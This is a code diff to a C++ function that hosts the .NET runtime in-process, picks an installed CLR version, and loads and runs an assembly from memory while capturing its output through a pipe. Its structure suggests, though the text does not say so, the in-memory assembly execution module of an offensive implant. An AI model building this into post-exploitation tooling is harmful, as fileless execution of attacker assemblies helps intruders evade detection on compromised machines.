@@ -28,31 +28,49 @@ auto DECLFN Dotnet::Inline(
     SAFEARRAY*     SafeExpc  = {};
     SAFEARRAY*	   SafeArgs  = {};
 
+    WCHAR            FmVersion[MAX_PATH] = { 0 };
+    ULONG            FmBuffLen = MAX_PATH;
+
     BOOL             IsLoadable  = FALSE;
     HRESULT          HResult     = 0;
-    VARIANT          VariantArgv = {};
-    _Assembly*       Assembly    = {};
-    _AppDomain*      AppDom      = {};
-    _MethodInfo*     MethodInfo  = {};
-    IUnknown*        AppDomThunk = {};
-    IEnumUnknown*    EnumUkwn    = {};
-    ICLRMetaHost*    MetaHost    = {};
-    ICLRRuntimeInfo* RtmInfo     = {};
-    ICorRuntimeHost* RtmHost     = {};
+    VARIANT          VariantArgv = { 0 };
+    _Assembly*       Assembly    = { 0 };
+    _AppDomain*      AppDom      = { 0 };
+    _MethodInfo*     MethodInfo  = { 0 };
+    IUnknown*        AppDomThunk = { 0 };
+    IUnknown*        EnumRtm     = { 0 };
+    IEnumUnknown*    EnumUkwn    = { 0 };
+    ICLRMetaHost*    MetaHost    = { 0 };
+    ICLRRuntimeInfo* RtmInfo     = { 0 };
+    ICorRuntimeHost* RtmHost     = { 0 };
 
     LONG Idx = 0;
 
     SECURITY_ATTRIBUTES SecAttr = { 0 };
 
     HResult = Self->Mscoree.CLRCreateInstance( 
-        Self->Dot->GUID.xCLSID_CLRMetaHost, Self->Dot->GUID.xIID_ICLRMetaHost, (PVOID*)&MetaHost 
+        Self->Dot->CLSID.CLRMetaHost, Self->Dot->IID.ICLRMetaHost, (PVOID*)&MetaHost 
     );
     if ( HResult ) goto _KH_END;
 
-    HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
-    if ( HResult ) goto _KH_END;
+    if ( Version == L"v0.0.00000" ) {
+        HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
+        if ( HResult ) goto _KH_END;
 
-    HResult = MetaHost->GetRuntime( L"v4.0.30319", Self->Dot->GUID.xIID_ICLRRuntimeInfo, (PVOID*)&RtmInfo );
+        while ( EnumUkwn->Next( 1, &EnumRtm, 0 ) == S_OK) {
+            if ( !EnumRtm ) continue;
+    
+            if ( SUCCEEDED( EnumRtm->QueryInterface( Self->Dot->IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo) ) && RtmInfo ) {
+                
+                if ( SUCCEEDED( RtmInfo->GetVersionString( FmVersion, &FmBuffLen ) ) ) {
+                    Version = FmVersion;
+                    KhDbg("supported version: %S", FmVersion);
+                }
+            }
+        }
+    }
+
+    HResult = MetaHost->GetRuntime( Version, Self->Dot->IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo );
     if ( HResult ) goto _KH_END;
 
     HResult = RtmInfo->IsLoadable( &IsLoadable );
@@ -60,7 +78,7 @@ auto DECLFN Dotnet::Inline(
     if ( HResult || !IsLoadable ) goto _KH_END;
 
     HResult = RtmInfo->GetInterface( 
-        Self->Dot->GUID.xCLSID_CorRuntimeHost, Self->Dot->GUID.xIID_ICorRuntimeHost, (PVOID*)&RtmHost 
+        Self->Dot->CLSID.CorRuntimeHost, Self->Dot->IID.ICorRuntimeHost, (PVOID*)&RtmHost 
     );
     if ( HResult ) goto _KH_END;
 
@@ -70,7 +88,7 @@ auto DECLFN Dotnet::Inline(
     HResult = RtmHost->CreateDomain( AppDomName, 0, &AppDomThunk );
     if ( HResult ) goto _KH_END;
 
-    HResult = AppDomThunk->QueryInterface( Self->Dot->GUID.xIID_AppDomain, (PVOID*)&AppDom );
+    HResult = AppDomThunk->QueryInterface( Self->Dot->IID.AppDomain, (PVOID*)&AppDom );
     if ( HResult ) goto _KH_END;
 
     SafeBound = { AsmLength, 0 };
@@ -97,8 +115,8 @@ auto DECLFN Dotnet::Inline(
                 }
 			}
 
-			VariantArgv.parray = Self->Oleaut32.SafeArrayCreateVector(VT_BSTR, 0, AsmArgc);
-			VariantArgv.vt     = (VT_ARRAY | VT_BSTR);
+			VariantArgv.parray = Self->Oleaut32.SafeArrayCreateVector( VT_BSTR, 0, AsmArgc );
+			VariantArgv.vt     = ( VT_ARRAY | VT_BSTR );
 
 			for ( Idx = 0; Idx < AsmArgc; Idx++ ) {
 				Self->Oleaut32.SafeArrayPutElement( VariantArgv.parray, &Idx, Self->Oleaut32.SysAllocString( AsmArgv[Idx] ) );
@@ -133,6 +151,8 @@ auto DECLFN Dotnet::Inline(
     if ( HResult ) goto _KH_END;
 
     Self->Dot->Buffer.a = (PCHAR)Self->Hp->Alloc( PIPE_BUFFER_LENGTH );
+
+    KhDbg( "start read output of the assembly" );
 
     Success = Self->Krnl32.ReadFile( PipeRead, Self->Dot->Buffer.a, PIPE_BUFFER_LENGTH, &Self->Dot->Buffer.s, 0 );
 
@@ -188,8 +208,8 @@ _KH_END:
     return HResult;
 }
 
-auto Dotnet::PatchExit(
-    _In_ ICorRuntimeHost* IRuntime
-) -> HRESULT {
+// auto Dotnet::PatchExit(
+//     _In_ ICorRuntimeHost* IRuntime
+// ) -> HRESULT {
     
-}
+// }
